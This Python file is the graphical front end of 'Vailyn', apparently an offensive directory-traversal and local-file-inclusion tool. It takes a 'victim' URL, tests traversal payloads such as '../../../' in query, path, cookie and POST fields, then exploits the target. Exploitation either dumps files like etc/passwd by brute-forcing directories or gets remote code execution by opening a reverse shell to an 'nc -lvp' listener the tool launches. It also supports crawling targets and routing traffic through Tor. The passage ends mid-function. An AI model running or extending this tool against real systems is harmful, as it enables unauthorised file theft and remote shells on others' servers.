#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;
    , ;
     .

       .
     .;.
     .;
      :
      ,


┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

import subprocess
import sys
import random
import datetime
import time
import os

import core.variables as variables

from math import factorial

from multiprocessing.pool import ThreadPool as Pool

from PyQt5 import QtWidgets, uic, QtGui
from PyQt5.QtWidgets import (
    QTreeWidgetItem,
    QFileDialog,
)
from scrapy.crawler import CrawlerRunner

from twisted.internet import reactor

from multiprocessing import Process, Queue

from core.variables import (
    payloadlist,
    nullchars,
    processes,
    cachedir,
    rce,
    is_windows,
    vector_count,
)

from core.config import TERMINAL, TERM_CMD_TYPE

from core.methods.list import (
    listsplit,
    listperm,
    gensplit,
)

from core.methods.attack import (
    phase1, phase2, lfi_rce, reset_counter
)
from core.methods.cookie import (
    fetch_cookie, dict_from_header
)
from core.methods.cache import load, save, parse_url
from core.methods.tor import enable_tor
from core.methods.version import check_version
from core.methods.loot import set_date
from core.methods.print import (
    listprint2,
    print_techniques_gui,
    print_vectors_gui,
)
from core.methods.crawler import (
    UrlSpider,
    crawler_arjun,
    crawler_query,
    crawler_path,
    crawler_cookie,
    crawler_post_plain,
    crawler_post_json,
)

from core.methods.error import ShellPopException


class VailynApp(QtWidgets.QDialog):
    """
    Vailyn's Graphical User Interface
    """
    # initialise arguments
    victim = ""
    attack = 0
    filedict = ""
    dirdict = ""
    depth1 = 8
    depth2 = 2
    permutation_level = 2
    param = ""
    post = ""
    auth_cookie = ""
    tor = False
    loot = False
    vlnfile = "etc/passwd"
    victim2 = ""

    nosploit = False

    # initialise results
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []
    foundnullbytes = []
    foundwrappers = []

    techniques = []

    cookie = ""
    selected = ""

    unix = False

    target_index = 0
    attack_index = 1
    option_index = 2
    status = ""

    firstiter = True

    last_phase2 = "leak"

    def __init__(self):
        super(VailynApp, self).__init__()
        uic.loadUi("core/qt5/Main.ui", self)  # Load the .ui file
        self.attackOption.addItem("spider")
        self.attackOption.addItem("query")
        self.attackOption.addItem("path")
        self.attackOption.addItem("cookie")
        self.attackOption.addItem("post-plain")
        self.attackOption.addItem("post-json")
        self.newTargetButton.clicked.connect(self.get_victim)
        self.attackButton.clicked.connect(self.attack_gui)
        self.infoButton.clicked.connect(self.show_attack_info)
        self.fileDictButton.clicked.connect(self.get_file_dictionary)
        self.dirDictButton.clicked.connect(self.get_dir_dictionary)
        self.checkCookieButton.clicked.connect(self.validate_auth_cookie)
        self.shellBox.stateChanged.connect(self.handle_shell)
        self.implantBox.stateChanged.connect(self.handle_implant)
        self.nosploitBox.stateChanged.connect(self.handle_phase2)
        self.attackOption.currentIndexChanged.connect(self.update_attack)
        self.attack = self.attackOption.currentIndex()
        self.treeView.setHeaderHidden(True)
        self.versionLabel.setText("Vailyn {}".format(
            variables.e_version,
        ))
        self.stackedWidget.setCurrentWidget(self.fileTree)
        self.updateButton.clicked.connect(self.gui_check_update)
        self.smallQuitBtn.clicked.connect(self.close)
        self.tabWidget.currentChanged.connect(self.update_title)
        self.update_attack()
        self.show()

    def gui_check_update(self, initial=False):
        if check_version():
            self.status = "latest version"
            if not initial:
                self.show_info(
                    "You are running the latest version of Vailyn."
                )
        else:
            self.status = "update available"
            if not initial:
                self.show_info(
                    "An update is available!"
                )

    def update_title(self):
        index_map = {
            self.target_index: "Vailyn",
            self.attack_index: "Attack",
            self.option_index: "Conf.",
        }

        title = "Vailyn"
        try:
            title = index_map[self.tabWidget.currentIndex()]
        except KeyError:
            print("[EXCEPTION] KeyError setting title!")

        self.activeTitleLabel.setText(title)

    def update_attack(self):
        self.attack = self.attackOption.currentIndex()
        if self.attack == 0:
            self.stackedWidget.setCurrentWidget(self.crawlerOutput)
        elif self.shellBox.isChecked():
            self.stackedWidget.setCurrentWidget(self.crawlerOutput)
        else:
            self.stackedWidget.setCurrentWidget(self.fileTree)
        self.show()

    def get_filename(self):
        return QFileDialog.getOpenFileName()

    def validate_auth_cookie(self):
        valid = True
        if "cookie:" in self.cookieDisplay.text().lower():
            self.show_error("Only enter the header value. (omit Cookie:)")
            valid = False
        if "=" not in self.cookieDisplay.text():
            self.show_error("Expected Format: name=val;name2=val2")
            valid = False
        if valid:
            self.show_info("Cookie formatted correctly.")

    def get_file_dictionary(self):
        self.fileDictDisplay.setText(self.get_filename()[0])

    def get_dir_dictionary(self):
        self.dirDictDisplay.setText(self.get_filename()[0])

    def show_attack_info(self):
        if self.attack == 1:
            self.show_info("[GET] http://example.com?file=../../../")
        elif self.attack == 2:
            self.show_info("[GET] http://example.com/../../../")
        elif self.attack == 3:
            self.show_info("[GET] http://example.com COOKIE=../../../")
        elif self.attack == 4:
            self.show_info("[POST] http://example.com PLAIN=../../../")
        elif self.attack == 5:
            self.show_info("[POST] http://example.com JSON=../../../")
        elif self.attack == 0:
            self.show_info("Automatically retreive all links & perform all tests")

    def show_info(self, message):
        self.infoDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Info.ui", self.infoDialog)
        self.infoDialog.infoMessage.setText(message)
        self.infoDialog.okButton.clicked.connect(self.infoDialog.close)
        self.infoDialog.exec_()

    def gui_select(self, payloadlist, nullbytes=False, wrappers=False):
        def intern():
            self.selectedp = self.payloadDialog.payloadSelectInput.text()
            if self.selectedp.strip().lower() == "a":
                self.selection = payloadlist
            elif (nullbytes or wrappers) and self.selectedp.strip().lower() == "n":
                self.selection = []
            else:
                try:
                    self.selection = [
                        payloadlist[int(i.strip())]
                        for i in self.selectedp.split(",")
                    ]
                    self.payloadDialog.close()
                except Exception:
                    self.show_error("Invalid Selection string.")

        self.pacancel = False

        def cancel():
            self.pacancel = True
            self.payloadDialog.close()

        # filter duplicates
        payloadlist = list(set(payloadlist))
        pstr = ""
        pstr = pstr + listprint2(payloadlist, nullbytes, wrappers)

        self.selectedp = ""
        self.payloadDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Payload.ui", self.payloadDialog)
        self.payloadDialog.payloadBrowser.setText(pstr)
        if nullbytes:
            self.payloadDialog.selectLabel.setText("Select Nullbytes")
        elif wrappers:
            self.payloadDialog.selectLabel.setText("Select PHP Wrappers")
        else:
            self.payloadDialog.selectLabel.setText("Select Payloads")
        self.payloadDialog.selectPayloadButton.clicked.connect(intern)
        self.payloadDialog.cancelButton.clicked.connect(cancel)
        self.payloadDialog.payloadSelectInput.returnPressed.connect(
            self.payloadDialog.selectPayloadButton.click,
        )
        self.selection = []
        self.payloadDialog.exec_()

        if self.pacancel:
            return None
        return self.selection

    def gui_select_techniques(self):
        def intern():
            self.techniqueStr = self.techniqueDialog.payloadSelectInput.text()
            error = False
            if self.techniqueStr.strip().lower() == "a":
                self.selection = list(range(1, len(rce.items()) + 1))
                self.techniqueDialog.close()
            else:
                try:
                    for i in self.techniqueStr.split(","):
                        technique = int(i.strip())
                        if technique not in range(1, len(rce.items()) + 1):
                            error = True
                        elif technique not in self.selection:
                            self.selection.append(technique)
                    if error:
                        self.show_error("Invalid Selection string.")
                        self.selection = []
                    else:
                        self.techniqueDialog.close()
                except Exception:
                    self.show_error("Invalid Selection string.")

        self.pacancel = False

        def cancel():
            self.pacancel = True
            self.techniqueDialog.close()

        tstr = ""
        tstr = tstr + print_techniques_gui()

        self.techniqueStr = ""
        self.techniqueDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Payload.ui", self.techniqueDialog)
        self.techniqueDialog.payloadBrowser.setText(tstr)
        self.techniqueDialog.selectLabel.setText("Select Techniques")
        self.techniqueDialog.selectPayloadButton.clicked.connect(intern)
        self.techniqueDialog.cancelButton.clicked.connect(cancel)
        self.techniqueDialog.payloadSelectInput.returnPressed.connect(
            self.techniqueDialog.selectPayloadButton.click
        )
        self.selection = []
        self.techniqueDialog.exec_()

        if self.pacancel:
            return None
        return self.selection

    def gui_select_vectors(self):
        def intern():
            self.vectorStr = self.vectorDialog.payloadSelectInput.text()
            error = False
            if self.vectorStr.strip().lower() == "a":
                self.selection = list(range(1, vector_count + 1))
                self.vectorDialog.close()
            else:
                try:
                    for i in self.vectorStr.split(","):
                        vector = int(i.strip())
                        if vector not in range(1, vector_count + 1):
                            error = True
                        elif vector not in self.selection:
                            self.selection.append(vector)
                    if error:
                        self.show_error("Invalid Selection string.")
                        self.selection = []
                    else:
                        self.vectorDialog.close()
                except Exception:
                    self.show_error("Invalid Selection string.")

        self.pacancel = False

        def cancel():
            self.pacancel = True
            self.vectorDialog.close()

        vstr = ""
        vstr = vstr + print_vectors_gui()

        self.vectorStr = ""
        self.vectorDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Payload.ui", self.vectorDialog)
        self.vectorDialog.payloadBrowser.setText(vstr)
        self.vectorDialog.selectLabel.setText("Select Vectors")
        self.vectorDialog.selectPayloadButton.clicked.connect(intern)
        self.vectorDialog.cancelButton.clicked.connect(cancel)
        self.vectorDialog.payloadSelectInput.returnPressed.connect(
            self.vectorDialog.selectPayloadButton.click
        )
        self.selection = []
        self.vectorDialog.exec_()

        if self.pacancel:
            return None
        return self.selection

    def show_payloads(self, payloadlist, nullbytelist, wrapperlist):
        # filter duplicates
        payloadlist = list(set(payloadlist))
        nullbytelist = list(set(nullbytelist))
        wrapperlist = list(set(wrapperlist))
        pstr = ""
        pstr = pstr + "Payloads:\n"
        for i in range(0, len(payloadlist)):
            pstr = pstr + "  " + payloadlist[i] + "\n"
        pstr = pstr + "\nNullbytes:\n"
        for i in range(0, len(nullbytelist)):
            pstr = pstr + "  " + nullbytelist[i] + "\n"
        if variables.lfi:
            pstr = pstr + "\nPHP Wrappers:\n"
            for i in range(0, len(wrapperlist)):
                pstr = pstr + "  " + wrapperlist[i] + "\n"

        self.payloadShowDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/PayloadShow.ui", self.payloadShowDialog)
        self.payloadShowDialog.payloadBrowser.setText(pstr)
        self.payloadShowDialog.okButton.clicked.connect(
            self.payloadShowDialog.close,
        )
        self.payloadShowDialog.exec_()

    def read_cookie_gui(self, target, cookie=""):
        def intern():
            self.selected = self.cookieDialog.cookieSelectInput.text().strip()
            if self.selected == "" or self.selected not in self.cstr:
                self.show_error("Invalid Cookie Name.")
            else:
                self.cookieDialog.close()

        cookie = fetch_cookie(target, auth_cookie=cookie)
        self.cocancel = False
        i = 0
        if len(cookie.keys()) < 1:
            self.show_error("Server did not send any cookies.")
            return (None, None)
        self.cstr = ""
        for key in cookie.keys():
            self.cstr = self.cstr + key + "\n"
            i += 1

        def cancel():
            self.cookieDialog.close()
            self.cocancel = True

        self.selected = ""
        self.cookieDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Cookie.ui", self.cookieDialog)
        self.cookieDialog.cookieBrowser.setText(self.cstr)
        self.cookieDialog.selectCookieButton.clicked.connect(intern)
        self.cookieDialog.cancelButton.clicked.connect(cancel)
        self.cookieDialog.cookieSelectInput.returnPressed.connect(
            self.cookieDialog.selectCookieButton.click,
        )
        self.cookieDialog.exec_()
        if self.cocancel:
            return (None, None)

        return (cookie, self.selected)

    def handle_shell(self):
        if self.shellBox.isChecked():
            variables.revshell = True
            self.portEdit.setEnabled(True)
            self.ipEdit.setEnabled(True)
            self.implantBox.setChecked(False)
        else:
            variables.revshell = False
            self.portEdit.setEnabled(False)
            self.ipEdit.setEnabled(False)

        if self.shellBox.isChecked() or self.implantBox.isChecked():
            self.fileDictDisplay.setEnabled(False)
            self.dirDictDisplay.setEnabled(False)
            self.fileDictButton.setEnabled(False)
            self.dirDictButton.setEnabled(False)
        else:
            self.fileDictDisplay.setEnabled(True)
            self.dirDictDisplay.setEnabled(True)
            self.fileDictButton.setEnabled(True)
            self.dirDictButton.setEnabled(True)

        self.attack = self.attackOption.currentIndex()
        if self.shellBox.isChecked():
            self.stackedWidget.setCurrentWidget(self.crawlerOutput)
        elif self.attack == 0:
            self.stackedWidget.setCurrentWidget(self.crawlerOutput)
        else:
            self.stackedWidget.setCurrentWidget(self.fileTree)
        self.show()

    def handle_implant(self):
        if self.implantBox.isChecked():
            variables.implant = True
            self.implantSrcEdit.setEnabled(True)
            self.implantDestEdit.setEnabled(True)
            self.shellBox.setChecked(False)
        else:
            variables.implant = False
            self.implantSrcEdit.setEnabled(False)
            self.implantDestEdit.setEnabled(False)

        if self.shellBox.isChecked() or self.implantBox.isChecked():
            self.fileDictDisplay.setEnabled(False)
            self.dirDictDisplay.setEnabled(False)
            self.fileDictButton.setEnabled(False)
            self.dirDictButton.setEnabled(False)
        else:
            self.fileDictDisplay.setEnabled(True)
            self.dirDictDisplay.setEnabled(True)
            self.fileDictButton.setEnabled(True)
            self.dirDictButton.setEnabled(True)

        self.show()

    def handle_phase2(self):
        if self.nosploitBox.isChecked():
            self.nosploit = True
            if self.shellBox.isChecked():
                self.last_phase2 = "inject"
                self.shellBox.setChecked(False)
            elif self.implantBox.isChecked():
                self.last_phase2 = "implant"
                self.implantBox.setChecked(False)
            else:
                self.last_phase2 = "leak"
            self.fileDictDisplay.setEnabled(False)
            self.dirDictDisplay.setEnabled(False)
            self.fileDictButton.setEnabled(False)
            self.dirDictButton.setEnabled(False)
            self.shellBox.setEnabled(False)
            self.implantBox.setEnabled(False)
        else:
            self.nosploit = False
            if self.last_phase2 == "inject":
                self.shellBox.setChecked(True)
            elif self.last_phase2 == "implant":
                self.implantBox.setChecked(True)
            else:
                self.fileDictDisplay.setEnabled(True)
                self.dirDictDisplay.setEnabled(True)
                self.fileDictButton.setEnabled(True)
                self.dirDictButton.setEnabled(True)
            self.shellBox.setEnabled(True)
            self.implantBox.setEnabled(True)

        self.show()

    def attack_gui(self):
        self.foundfiles = [""]
        self.foundurls = [""]
        self.foundpayloads = []
        self.foundnullbytes = []
        self.attack = self.attackOption.currentIndex()
        self.filedict = self.fileDictDisplay.text().strip()
        self.dirdict = self.dirDictDisplay.text().strip()

        self.timeLabel.setText("")

        variables.precise = self.preciseFlag.isChecked()
        variables.lfi = self.lfiBox.isChecked()

        if (
            self.victim == ""
            or (self.attack == 1 and self.param == "")
            or (
                (self.filedict == "" or self.dirdict == "")
                and self.attack != 0 and not self.nosploit
                and not self.shellBox.isChecked()
                and not self.implantBox.isChecked()
            )
        ):
            self.show_error("Mandatory argument(s) not specified.")
            return

        try:
            self.depth1 = int(self.phase1Depth.text().strip())
        except ValueError:
            if self.phase1Depth.text().strip() != "":
                self.show_error(
                    "Depths must be valid positive integers!",
                )
                return
        try:
            self.depth2 = int(self.phase2Depth.text().strip())
        except ValueError:
            if self.phase2Depth.text().strip() != "":
                self.show_error(
                    "Depths must be valid positive integers!",
                )
                return
        try:
            self.permutation_level = int(self.phase2PLevel.text().strip())
        except ValueError:
            if self.phase2PLevel.text().strip() != "":
                self.show_error(
                    "Depths must be valid positive integers!",
                )
                return

        if variables.revshell:
            try:
                variables.LISTENIP = self.ipEdit.text().strip()
                variables.LISTENPORT = self.portEdit.text().strip()
                assert (
                    variables.LISTENPORT != ""
                    and variables.LISTENIP != ""
                )
            except AssertionError:
                self.show_error(
                    "Listening IP and Port needed for attack.",
                )
                return

        timeout = self.timeoutEdit.text().strip()
        if timeout != "":
            try:
                variables.timeout = int(timeout)
                assert(variables.timeout > 0)
            except (ValueError, AssertionError):
                self.show_error(
                    "Timeout must be a valid positive integer!",
                )
                return

        self.auth_cookie = self.cookieDisplay.text().strip()
        self.loot = self.lootBox.isChecked()
        self.tor = self.torBox.isChecked()
        self.vlnfile = self.vlnFileInput.text().strip()

        if self.tor:
            sig = enable_tor(shell=False)
            if sig == 420:
                ans = self.show_question(
                    "Do you have the Tor service up and running?",
                )
                if not ans:
                    return
                enable_tor(shell=False, sig_win=True)
            elif sig == 1337:
                ans = self.show_question(
                    "Do you want to start the Tor service?",
                )
                if not ans:
                    return
                self.unix = True
                enable_tor(shell=False, sig_lin=True)

        paysplit = listsplit(
            payloadlist,
            round(len(payloadlist) / processes),
        )

        if self.attack == 1 and self.param == "":
            self.show_error(
                "An attack parameter is required for this attack.",
            )
            return
        elif (self.attack == 4 or self.attack == 5) and self.post == "":
            self.show_error(
                "A post data string is required for this attack.",
            )
            return

        if self.attack in [4, 5] and "INJECT" not in self.post:
            self.show_error(
                "POST Data needs to contain INJECT at injection point",
            )
            return

        if self.attack == 4 and "=" not in self.post:
            self.show_error(
                "POST Data needs to be of form P1=V1&P2=V2",
            )
            return

        self.progressBar.setEnabled(True)
        self.treeView.clear()

        if self.attack == 0:
            crawler_list = self.gui_select_vectors()
            if not crawler_list:
                self.show_error("Error occurred with selection.")
                return
            time_slept = 0.0
            self.crawlerResultDisplay.setText("")
            variables.viclist.clear()
            crawlcookies = {}
            arjunjar = None
            if self.auth_cookie != "":
                arjunjar = self.auth_cookie
                crawlcookies = dict_from_header(arjunjar)

            def runSpider():
                def f(q):
                    try:
                        ua = variables.user_agents[
                            random.randrange(0, len(variables.user_agents))
                        ]
                        process = CrawlerRunner(
                            {"USER_AGENT": ua, "LOG_ENABLED": False}
                        )
                        d = process.crawl(
                            UrlSpider,
                            cookiedict=crawlcookies,
                            url=self.victim,
                        )
                        d.addBoth(lambda _: reactor.stop())
                        reactor.run()
                        q.put(None)
                    except Exception as e:
                        q.put(e)

                q = Queue()
                p = Process(target=f, args=(q,))
                p.start()
                result = q.get()
                p.join()
                if result is not None:
                    print("Crawler error: {}".format(result))
                    self.show_error(
                        "A crawler error has occurred.",
                    )

            self.tabWidget.setCurrentIndex(self.attack_index)
            self.timeLabel.setText("Active Phase: 0")
            self.crawlerResultDisplay.append(
                "; /_ '/\n|/(//((//)\n'     /\n"
            )
            self.crawlerResultDisplay.append(
                "[Info] Vailyn Scraper started.\n",
            )
            self.show()
            app.processEvents()
            starting_time = time.time()

            runSpider()
            subdir = parse_url(self.victim)

            with open(
                        cachedir + subdir + "spider-phase0.txt",
                        "r",
                    ) as vicfile:
                for line in vicfile:
                    variables.viclist.append(line.strip())
                    self.crawlerResultDisplay.append(
                        "[+] Found {}".format(line.strip()),
                    )

            if 1 in crawler_list:
                self.crawlerResultDisplay.append(
                    "\n[Info] Arjun GET Scan started.",
                )
                self.timeLabel.setText("Active Phase: Arjun")
                self.show()
                app.processEvents()
                site_params = crawler_arjun(cookie_header=self.auth_cookie)

                self.timeLabel.setText("Active Phase: Query")
                self.show()
                app.processEvents()
                crawler_query(
                    site_params, self.victim2, variables.verbose,
                    self.depth1, self.vlnfile, self.auth_cookie, gui=self,
                )
                time.sleep(1)
                time_slept += 1.0

            if 2 in crawler_list:
                self.timeLabel.setText("Active Phase: Path")
                self.show()
                app.processEvents()
                crawler_path(
                    self.victim2, variables.verbose, self.depth1,
                    self.vlnfile, self.auth_cookie, gui=self,
                )
                time.sleep(1)
                time_slept += 1.0

            if 3 in crawler_list:
                self.timeLabel.setText("Active Phase: Cookie")
                self.show()
                app.processEvents()
                crawler_cookie(
                    self.victim2, variables.verbose, self.depth1,
                    self.vlnfile, self.auth_cookie, gui=self,
                )
                time.sleep(1)
                time_slept += 1.0

            if 4 in crawler_list:
                self.crawlerResultDisplay.append(
                    "\n[Info] Arjun POST Plain Scan started.",
                )
                self.timeLabel.setText("Active Phase: Arjun")
                self.show()
                app.processEvents()
                post_params = crawler_arjun(
                    post=True,
                    cookie_header=self.auth_cookie,
                )

                self.timeLabel.setText("Active Phase: POST, plain")
                self.show()
                app.processEvents()
                crawler_post_plain(
                    post_params, self.victim2, variables.verbose,
                    self.depth1, self.vlnfile, self.auth_cookie,
                    gui=self,
                )
                time.sleep(1)
                time_slept += 1

            if 5 in crawler_list:
                self.crawlerResultDisplay.append(
                    "\n[Info] Arjun POST JSON Scan started.",
                )
                self.timeLabel.setText("Active Phase: Arjun")
                self.show()
                app.processEvents()
                json_params = crawler_arjun(
                    jpost=True,
                    cookie_header=self.auth_cookie,
                )

                self.timeLabel.setText("Active Phase: POST, json")
                self.show()
                app.processEvents()
                crawler_post_json(
                    json_params, self.victim2, variables.verbose,
                    self.depth1, self.vlnfile, self.auth_cookie,
                    gui=self,
                )

            ending_time = time.time()
            total_time = ending_time - starting_time - time_slept
            atime = datetime.timedelta(seconds=total_time)
            self.timeLabel.setText(
                "Done after " + str(atime) + ".",
            )
            self.show()

            return

        if self.attack == 3:
            (
                self.cookie,
                self.selected,
            ) = self.read_cookie_gui(self.victim, cookie=self.auth_cookie)
            if self.cookie is None or self.selected is None:
                return

        vlnysis = True

        self.tabWidget.setCurrentIndex(self.attack_index)
        self.show()
        app.processEvents()

        # present option to skip phase 1 if cache from previous attack present
        targetcache = parse_url(self.victim)
        if (os.path.exists(cachedir + targetcache + "payloads.cache")
                and os.path.exists(cachedir + targetcache + "nullbytes.cache")
                and os.path.exists(cachedir + targetcache + "wrappers.cache")):
            choice = self.show_question(
                "Detected payload cache. Do you want"
                " to load the cache and skip Phase 1?"
            )
            if choice:
                vlnysis = False
                (
                    self.foundpayloads,
                    self.foundnullbytes,
                    self.foundwrappers
                ) = load(targetcache)

        if vlnysis:
            starting_time = time.time()
            # initiate phase 1 - vulnerability analysis
            reset_counter()
            self.timeLabel.setText("Active Phase: 1")
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(phase1, args=(
                    self.attack, self.victim, self.victim2,
                    self.param, self.cookie, self.selected,
                    variables.verbose, self.depth1, splitty,
                    self.vlnfile, self.auth_cookie, self.post, self,
                )) for splitty in paysplit]

                for i in res:
                    # fetch results
                    tuples = i.get()
                    self.foundpayloads += tuples[0]
                    self.foundnullbytes += tuples[1]
                    self.foundwrappers += tuples[2]

            ending_time = time.time()
            vuln_time = ending_time - starting_time
            # save working payloads to cache
            save(
                targetcache,
                self.foundpayloads,
                self.foundnullbytes,
                self.foundwrappers,
            )
        else:
            vuln_time = 0.0

        # determine if phase 2 happens
        attackphase = False
        if self.foundpayloads:
            attackphase = True
            if not self.nosploit:
                self.selectedpayloads = self.gui_select(
                    self.foundpayloads,
                )
                if self.foundnullbytes:
                    self.selectednullbytes = self.gui_select(
                        self.foundnullbytes,
                        nullbytes=True,
                    )
                else:
                    self.selectednullbytes = []
                if self.foundwrappers:
                    self.selectedwrappers = self.gui_select(
                        self.foundwrappers,
                        wrappers=True,
                    )
                else:
                    self.selectedwrappers = []
            else:
                self.show_payloads(
                    self.foundpayloads,
                    self.foundnullbytes,
                    self.foundwrappers,
                )
                return
        else:
            self.selectedwrappers = []
            if not self.nosploit:
                cont = self.show_question(
                    "No payload succeeded. Attack anyways?",
                )
                if cont:
                    attackphase = True
                    # attack with everything if phase 1 was unsuccessful
                    self.selectedpayloads = payloadlist
                    self.selectednullbytes = nullchars
                    self.selectedwrappers = [""]
                    if variables.lfi:
                        self.selectedwrappers += variables.phase1_wrappers
            else:
                self.show_info("No payload succeeded.")
                return

        if self.nosploit:
            attackphase = False

        if not self.selectedwrappers:
            self.selectedwrappers = [""]

        if attackphase:
            reset_counter()
            starting_time = time.time()
            self.timeLabel.setText("Active Phase: 2")
            if variables.revshell:
                if is_windows:
                    question = "Are you listening on {}, port {}?".format(
                        variables.LISTENIP, variables.LISTENPORT,
                    )
                    lis = self.show_question(question)
                    if not lis:
                        self.show_error(
                            "Please start a listener manually"
                            " before starting the attack."
                        )
                        return
                else:
                    listener_cmd = ["konsole", "-e"]
                    if TERMINAL:
                        listener_cmd = TERMINAL
                    cmd_str = [
                        "nc -lvp {}".format(variables.LISTENPORT),
                    ]
                    cmd_list = ["nc", "-lvp", variables.LISTENPORT]
                    if TERM_CMD_TYPE.strip().upper() == "STRING":
                        listener_cmd += cmd_str
                    else:
                        listener_cmd += cmd_list
                    with open(os.devnull, "w") as DEVNULL:
                        subprocess.Popen(
                            listener_cmd,
                            close_fds=True,
                            stdout=DEVNULL,
                            stderr=subprocess.STDOUT,
                        )
                self.techniques = self.gui_select_techniques()
                if not self.techniques:
                    return
                starting_time = time.time()
                try:
                    lfi_rce(
                        self.techniques, self.attack, self.victim,
                        self.victim2, self.param, self.cookie,
                        self.selected, variables.verbose,
                        self.selectedpayloads, self.selectednullbytes,
                        self.selectedwrappers, self.auth_cookie, self.post,
                        self.depth2, gui=self, app=app,
                    )
                except ShellPopException:
                    pass
            elif variables.implant:
                # TODO
                self.show_error("Not implemented.")
            else:
                set_date()
                # equally split dictionary entries to all threads
                sdirlen = 0
                with open(self.dirdict, "r") as f:
                    sdirlen = sum(1 for line in f if line.rstrip()) + 1

                if sdirlen > 100:
                    self.show_info("Preparing dictionaries...")

                dirlen2 = sdirlen
                felems = dirlen2 - 1
                i = 1
                while (i <= self.permutation_level):
                    if 0 <= i + 1 and i + 1 <= felems:
                        cur = factorial(felems) / factorial(felems - i - 1)
                    else:
                        cur = 0
                    dirlen2 += cur
                    i += 1
                dirlen = int(dirlen2)
                splitted = gensplit(
                    listperm(self.dirdict, self.permutation_level),
                    round(dirlen / processes),
                )

                starting_time = time.time()
                with Pool(processes=processes) as pool:
                    res = [pool.apply_async(phase2, args=(
                        self.attack, self.victim, self.victim2, self.param,
                        self.cookie, self.selected, self.filedict, splitty,
                        self.depth2, variables.verbose, self.loot,
                        self.selectedpayloads, self.selectednullbytes,
                        self.selectedwrappers, self.auth_cookie,
                        self.post, dirlen, self,
                    )) for splitty in splitted]
                    for i in res:
                        # fetch results
                        restuple = i.get()
                        self.foundfiles += restuple[0]
                        self.foundurls += restuple[1]

        ending_time = time.time()
        attack_time = ending_time - starting_time
        total_time = vuln_time + attack_time

        readable_time = datetime.timedelta(seconds=total_time)

        if self.foundfiles:
            self.gui_tree(readable_time)

        self.show_info(
            "Attack done. Found {} files in {}.".format(
                len(self.foundfiles) - 1, readable_time,
            )
        )

        if self.tor and self.unix:
            stop = self.show_question(
                "Do you want to terminate the Tor service?",
            )
            if stop:
                try:
                    subprocess.run(["systemctl", "stop", "tor"])
                except OSError:
                    subprocess.run(["service", "tor", "stop"])
                except OSError:
                    subprocess.run(["brew", "services", "stop", "tor"])
                except Exception as e:
                    sys.exit(e)

    def get_victim(self):
        def intern():
            vic = self.targetDialog.vicField.text().strip()
            pam = self.targetDialog.paramField.text().strip()
            vic2 = self.targetDialog.vic2Field.text().strip()
            post = self.targetDialog.postInput.text().strip()
            if vic == "":
                self.show_error("-v VIC must be specified.")
            elif self.attack == 1 and pam == "":
                self.show_error(
                    "-p PAM must be specified for query attack.",
                )
            elif self.attack in [4, 5] and post == "":
                self.show_error(
                    "-s DAT must be specified for POST attack.",
                )
            elif "://" not in vic:
                self.show_error(
                    "scheme:// must be sepecified in -v VIC.",
                )
            else:
                self.victim = vic
                if self.attack == 1:
                    self.param = pam
                self.victim2 = vic2
                if self.attack in [4, 5]:
                    self.post = post
                self.targetDialog.close()
                if self.attack == 1:
                    if "?" not in vic:
                        self.victimDisplayLabel.setText(
                            vic + "?" + pam + "=INJECT" + vic2,
                        )
                        self.victimDisplayLabel.setToolTip(
                            vic + "?" + pam + "=INJECT" + vic2,
                        )
                    else:
                        self.victimDisplayLabel.setText(
                            vic + "&" + pam + "=INJECT" + vic2,
                        )
                        self.victimDisplayLabel.setToolTip(
                            vic + "&" + pam + "=INJECT" + vic2,
                        )
                elif self.attack in [0, 3, 4, 5]:
                    self.victimDisplayLabel.setText(vic + vic2)
                    self.victimDisplayLabel.setToolTip(vic + vic2)
                elif self.attack == 2:
                    if vic.endswith("/"):
                        self.victimDisplayLabel.setText(
                            vic + "INJECT" + vic2,
                        )
                        self.victimDisplayLabel.setToolTip(
                            vic + "INJECT" + vic2,
                        )
                    else:
                        self.victimDisplayLabel.setText(
                            vic + "/" + "INJECT" + vic2,
                        )
                        self.victimDisplayLabel.setToolTip(
                            vic + "/" + "INJECT" + vic2,
                        )
                self.show()

        self.targetDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Target.ui", self.targetDialog)
        if self.victim == "" and self.param == "" and self.victim2 == "":
            self.targetDialog.titleLabel.setText("Add New Target")
        else:
            self.targetDialog.titleLabel.setText("Edit Target")
        if self.attack == 1:
            self.targetDialog.paramLabel.setEnabled(True)
            self.targetDialog.paramField.setEnabled(True)
        else:
            self.targetDialog.paramLabel.setEnabled(False)
            self.targetDialog.paramField.setEnabled(False)
        if self.attack in [4, 5]:
            self.targetDialog.postLabel.setEnabled(True)
            self.targetDialog.postInput.setEnabled(True)
        else:
            self.targetDialog.postLabel.setEnabled(False)
            self.targetDialog.postInput.setEnabled(False)

        self.targetDialog.vicField.setText(self.victim)
        self.targetDialog.paramField.setText(self.param)
        self.targetDialog.postInput.setText(self.post)
        self.targetDialog.vic2Field.setText(self.victim2)
        self.targetDialog.cancelButton.clicked.connect(
            self.targetDialog.close,
        )
        self.targetDialog.setTargetButton.clicked.connect(intern)
        self.targetDialog.vicField.returnPressed.connect(
            self.targetDialog.setTargetButton.click,
        )
        self.targetDialog.paramField.returnPressed.connect(
            self.targetDialog.setTargetButton.click,
        )
        self.targetDialog.postInput.returnPressed.connect(
            self.targetDialog.setTargetButton.click,
        )
        self.targetDialog.vic2Field.returnPressed.connect(
            self.targetDialog.setTargetButton.click,
        )
        self.targetDialog.exec_()

    def gui_tree(self, atime):
        self.timeLabel.setText("Done after " + str(atime) + ".")
        root = QTreeWidgetItem(self.treeView)
        root.setText(0, "/")

        def create_tree(filepaths, root):
            for i in filepaths:
                contained = False
                # prevent dups if parent folder found
                for j in filepaths:
                    if i != j and i != "" and i in j:
                        contained = True
                if i != "" and not contained:
                    tree_append(i, root)

        def tree_append(path, parentnode):
            plist = path.split("/")
            id = plist[0]
            check = True
            for i in range(0, parentnode.childCount()):
                if parentnode.child(i).text(0) == id:
                    check = False
                    if len(plist) > 1:
                        tree_append("/".join(plist[1::]), parentnode.child(i))
            if check:
                child = QTreeWidgetItem(parentnode)
                child.setText(0, plist[0])
                if len(plist) > 1:
